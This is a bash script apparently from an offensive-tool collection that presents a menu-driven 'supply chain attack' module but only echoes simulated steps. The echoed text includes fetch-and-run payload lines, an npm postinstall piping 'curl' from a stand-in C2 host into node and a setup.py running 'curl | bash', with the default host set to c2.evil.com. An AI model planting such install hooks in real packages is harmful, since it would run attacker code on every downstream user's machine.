#!/bin/bash
# NULLSEC Supply Chain Attack - bad-antics development

# Source common library for Shodan integration

# === NULLSEC ENHANCED LOGGING ===
TARGET_DIR="${NULLSEC_TARGET_DIR:-$HOME/nullsec/logs/targets/default}"
LOG_FILE="${NULLSEC_LOG_FILE:-$TARGET_DIR/module.log}"

# Helper function: Log to file with timestamp
log_to_file() {
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] $1" >> "$LOG_FILE"
}

# Helper function: Save output to target directory
save_output() {
    local filename="$1"
    local content="$2"
    echo "$content" > "$TARGET_DIR/$filename"
    log_to_file "Saved output to $TARGET_DIR/$filename"
}

# Helper function: Log discovered vulnerability
log_vulnerability() {
    local severity="$1"
    local title="$2"
    local description="$3"
    echo "[$(date '+%Y-%m-%d %H:%M:%S')] VULNERABILITY [$severity] $title - $description" >> "$LOG_FILE"
}

# Read environment variables set by framework

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "$SCRIPT_DIR/nullsec-common.sh" 2>/dev/null

# Check for Shodan target
SHODAN_TARGET="/home/antics/nullsec/.shodan_target"
if [ -f "$SHODAN_TARGET" ]; then
    source "$SHODAN_TARGET"
    if [ ! -z "$TARGET" ]; then
        echo -e "${GREEN}[+]${RESET} Shodan target available: ${GREEN}$TARGET${RESET}"
    fi
fi

RED='\033[1;31m'; GREEN='\033[1;32m'; YELLOW='\033[1;33m'; CYAN='\033[1;36m'; WHITE='\033[1;37m'; DIM='\033[2m'; RESET='\033[0m'
clear
echo -e "${RED}▓▓▓ NULLSEC SUPPLY CHAIN ▓▓▓${RESET} ${CYAN}[ bad-antics ]${RESET}"
echo ""
echo -e "  ${YELLOW}Attack vector:${RESET}"
echo -e "    ${DIM}1) NPM package poisoning${RESET}"
echo -e "    ${DIM}2) PyPI package backdoor${RESET}"
echo -e "    ${DIM}3) GitHub Actions compromise${RESET}"
echo -e "    ${DIM}4) Container image trojan${RESET}"
echo -e "    ${DIM}5) Software update hijack${RESET}"
read -p "$(echo -e ${WHITE}'  [>] Select [1-5]: '${RESET})" VECTOR; [ -z "$VECTOR" ] && VECTOR="1"
read -p "$(echo -e ${WHITE}'  [>] Target package/repo: '${RESET})" TARGET; [ -z "$TARGET" ] && TARGET="popular-lib"
read -p "$(echo -e ${WHITE}'  [>] C2 endpoint: '${RESET})" C2; [ -z "$C2" ] && C2="https://c2.evil.com"
read -p "$(echo -e ${YELLOW}'  [!] SIMULATION? (y/N): '${RESET})" TEST_MODE; TEST_MODE=${TEST_MODE:-n}
echo ""
if [[ "$TEST_MODE" =~ ^[Yy]$ ]]; then
    vectors=("NPM" "PyPI" "GitHub Actions" "Container" "Update")
    echo -e "${YELLOW}[*]${RESET} Executing ${vectors[$((VECTOR-1))]} supply chain attack"
    echo -e "${DIM}[*] Target: $TARGET${RESET}"; sleep 0.4
    case $VECTOR in
        1)
            echo -e "${GREEN}[+]${RESET} Registering typosquat: $TARGET-js"
            echo -e "${GREEN}[+]${RESET} Injecting postinstall script"
            echo -e "${CYAN}\"postinstall\": \"curl $C2/payload | node\"${RESET}"
            ;;
        2)
            echo -e "${GREEN}[+]${RESET} Forking $TARGET"
            echo -e "${GREEN}[+]${RESET} Adding to setup.py:"
            echo -e "${CYAN}import os; os.system('curl $C2 | bash')${RESET}"
            ;;
        3)
            echo -e "${GREEN}[+]${RESET} Compromising workflow runner"
            echo -e "${GREEN}[+]${RESET} Exfiltrating secrets"
            ;;
        4)
            echo -e "${GREEN}[+]${RESET} Poisoning base image: $TARGET"
            echo -e "${GREEN}[+]${RESET} Adding backdoor layer"
            ;;
        5)
            echo -e "${GREEN}[+]${RESET} MITM on update server"
            echo -e "${GREEN}[+]${RESET} Serving trojanized update"
            ;;
    esac
    echo -e "${GREEN}[+]${RESET} Downstream victims will beacon to $C2"
    echo -e "${GREEN}[✓]${RESET} SIMULATION complete"
else
    echo -e "${RED}[*]${RESET} Supply chain attacks are highly illegal"
fi
